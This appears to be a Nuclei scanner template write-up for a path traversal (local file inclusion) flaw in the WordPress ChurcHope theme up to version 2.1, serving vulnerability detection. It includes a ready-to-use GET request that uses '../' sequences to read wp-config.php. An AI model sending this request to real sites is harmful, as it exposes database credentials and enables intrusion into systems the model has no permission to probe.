# Nuclei Template: WordPress ChurcHope Theme <= 2.1 - Local File Inclusion
**Template ID:** churchope-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`churchope-lfi.yaml`)

## Vulnerability Information & PoC

## Description
WordPress ChurcHope Theme <= 2.1 is susceptible to local file inclusion. The vulnerability is caused by improper filtration of user-supplied input passed via the 'file' HTTP GET parameter to the '/lib/downloadlink.php' script, which is publicly accessible.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php
```

## References
- https://wpscan.com/vulnerability/3c5833bd-1fe0-4eba-97aa-7d3a0c8fda15
